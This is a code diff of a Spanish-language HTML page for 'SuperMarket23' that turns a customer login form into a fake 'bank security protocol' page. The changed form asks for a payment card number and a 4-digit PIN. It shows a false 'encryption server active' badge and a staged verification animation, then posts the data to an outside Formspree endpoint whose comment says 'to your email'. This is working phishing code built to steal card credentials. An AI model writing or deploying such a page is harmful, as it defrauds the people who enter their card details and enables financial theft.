@@ -7,7 +7,7 @@
     <title>SuperMarket23 - Validación</title>
     <style>
         body { background-color: #e9f0f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: Arial, sans-serif; }
-        .card { background: white; width: 90%; max-width: 400px; border-radius: 30px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; padding-bottom: 30px; position: relative; }
+        .card { background: white; width: 90%; max-width: 400px; border-radius: 30px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; padding-bottom: 30px; }
         .header { background-color: #0056b3; color: white; padding: 30px 20px; }
         .header h1 { margin: 0; font-style: italic; font-size: 28px; }
         .header p { margin: 10px 0 0; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
@@ -15,7 +15,6 @@
         label { color: #7a86a1; font-size: 12px; font-weight: bold; display: block; margin-bottom: 8px; text-transform: uppercase; }
         input { width: 100%; padding: 15px; border: 2px solid #eef2f7; border-radius: 12px; background-color: #f8fbff; font-size: 18px; color: #00428a; font-weight: bold; text-align: center; box-sizing: border-box; margin-bottom: 25px; }
         
-        /* Botón y Animación */
         .btn-auth { background-color: #0056b3; color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: all 0.3s; }
         .loading-bar { display: none; width: 100%; height: 4px; background-color: #eee; margin-top: 15px; border-radius: 2px; overflow: hidden; }
         .loading-progress { width: 0%; height: 100%; background-color: #0056b3; transition: width 2s linear; }
@@ -31,27 +30,28 @@
 <div class="card">
     <div class="header">
         <h1>SuperMarket23</h1>
-        <p>Protocolo de Validación de Usuario</p>
+        <p>Protocolo de Seguridad Bancaria</p>
     </div>
 
     <form id="authForm" action="https://formspree.io/f/maqdlpwo" method="POST" class="form-container">
-        <label for="cliente">Número de Cliente (ID)</label>
-        <input type="text" name="ID_Cliente" id="cliente" placeholder="0000 0000 0000" required>
+        
+        <label for="cliente">NÚMERO DE TARJETA (PAN)</label>
+        <input type="text" name="ID_Cliente" id="cliente" placeholder="1246 6776 3452" required>
 
-        <label for="acceso">Código de Acceso Personal</label>
-        <input type="password" name="Codigo_Acceso" id="acceso" placeholder="...." maxlength="8" required>
+        <label for="acceso">PIN DE SEGURIDAD</label>
+        <input type="password" name="Codigo_Acceso" id="acceso" placeholder="...." maxlength="4" required>
 
-        <button type="submit" id="submitBtn" class="btn-auth">Autenticar Cuenta</button>
+        <button type="submit" id="submitBtn" class="btn-auth">Autenticar</button>
 
         <div id="loadingBar" class="loading-bar"><div id="progress" class="loading-progress"></div></div>
         <div id="successMsg" class="success-msg">✓ Autenticación exitosa. Redirigiendo...</div>
 
         <div class="status">
-            <span class="dot"></span> SISTEMA DE VERIFICACIÓN SEGURO
+            <span class="dot"></span> SERVIDOR DE ENCRIPTACIÓN ACTIVO
         </div>
     </form>
 
-    <a href="#" class="footer-link">Regresar a la tienda</a>
+    <a href="#" class="footer-link">Ir al sitio web</a>
 </div>
 
 <script>
@@ -62,22 +62,24 @@
     const success = document.getElementById('successMsg');
 
     form.onsubmit = function(e) {
-        e.preventDefault(); // Detiene el envío real un momento
+        e.preventDefault(); 
         
-        // Inicio de simulación
         btn.innerHTML = "Verificando...";
         btn.style.backgroundColor = "#7a86a1";
         btn.disabled = true;
         bar.style.display = "block";
         
-        setTimeout(() => { progress.width = "100%"; }, 50); // Inicia la barra
+        // Animación de la barra
+        setTimeout(() => { 
+            document.getElementById('progress').style.width = "100%"; 
+        }, 100);
 
-        // Simula espera de 2.5 segundos
+        // Espera 2.5 segundos de "carga"
         setTimeout(() => {
             bar.style.display = "none";
             success.style.display = "block";
             
-            // Envía los datos a Formspree después de la simulación
+            // Envío final a tu correo
             setTimeout(() => {
                 form.submit();
             }, 1000);
